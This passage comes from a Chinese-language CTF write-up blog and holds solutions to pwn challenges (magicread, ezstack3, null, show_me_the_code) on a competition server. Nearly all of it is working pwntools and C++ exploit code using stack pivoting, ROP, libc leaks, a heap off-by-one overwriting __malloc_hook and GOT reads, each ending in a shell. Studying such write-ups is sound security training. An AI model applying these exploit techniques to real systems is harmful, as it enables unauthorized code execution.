punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="magicread"><a href="#magicread" class="headerlink" title="magicread"></a>magicread</h3><p>栈迁移</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">40862</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>bss <span class="token operator">=</span> <span class="token number">0x601a00</span>read <span class="token operator">=</span> <span class="token number">0x400675</span>start <span class="token operator">=</span> <span class="token number">0x400510</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400723</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000400691</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23_11.3/libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>bin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="round3"><a href="#round3" class="headerlink" title="round3"></a>round3</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>直接<code>nc</code>连接输入<code>SuperSecretPassword</code></p><h3 id="ezstack3"><a href="#ezstack3" class="headerlink" title="ezstack3"></a>ezstack3</h3><p>栈迁移</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">32404</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'stack3'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shell <span class="token operator">=</span> <span class="token number">0x8049347</span>addr <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x40</span>bin_sh <span class="token operator">=</span> addr <span class="token operator">+</span> <span class="token number">0x28</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08049185</span>p <span class="token operator">=</span> p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>shell<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="null"><a href="#null" class="headerlink" title="null"></a>null</h3><p><code>off-by-one</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">37786</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebda0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseogg <span class="token operator">=</span> <span class="token number">0x10a2fc</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> <span class="token string">b'\x61'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span>edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="show-me-the-code"><a href="#show-me-the-code" class="headerlink" title="show_me_the_code"></a>show_me_the_code</h3><p><code>llvm</code>，用<code>c++</code>写<code>exp</code>，由于<code>opt-12</code>保护机制是<code>no pie</code>所以可以获取其中的<code>got</code>表里的<code>libc</code>地址，直接打<code>system(&#39;sh&#39;)</code></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">edoc</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">addi</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                                 <span class="token comment">//regs[x] = y + z                                                       x &lt;= 5</span>    <span class="token keyword">void</span> <span class="token function">chgr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                                        <span class="token comment">//regs[x] += y                                                          x &lt;= 5                  -0x1000 &lt; y &lt; 0x1000    onetime</span>    <span class="token keyword">void</span> <span class="token function">sftr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">bool</span> y<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                      <span class="token comment">//y = 1 : regs[x] &lt;&lt; z;         y = 0 : regs[x] >> z                    x &lt;= 5  y &lt; 0x40</span>    <span class="token keyword">void</span> <span class="token function">borr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> y<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>             <span class="token comment">//regs[x] = regs[y] | regs[z]                                           x &lt;= 5  y &lt;= 5  z &lt;= 5</span>    <span class="token keyword">void</span> <span class="token function">movr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                              <span class="token comment">//regs[x] = regs[y]                                                     x &lt; 8  y &lt; 8</span>    <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span>  y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                              <span class="token comment">//*(y+regs[6]) = regs[x]                                                x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span>    <span class="token keyword">void</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                               <span class="token comment">//regs[x] = *(y+regs[6])                                                x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span>    <span class="token keyword">void</span> <span class="token function">runc</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span>  y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                              <span class="token comment">//*(y+regs[6])(regs[x])                                                 x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>edoc obj<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">c0deVmMain</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x442000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//getenv_got</span>        obj<span class="token punctuation">.</span><span class="token function">movr</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x443000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">movr</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xad8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//2 -> getenv_addr</span>        obj<span class="token punctuation">.</span><span class="token function">sftr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">sftr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">borr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token 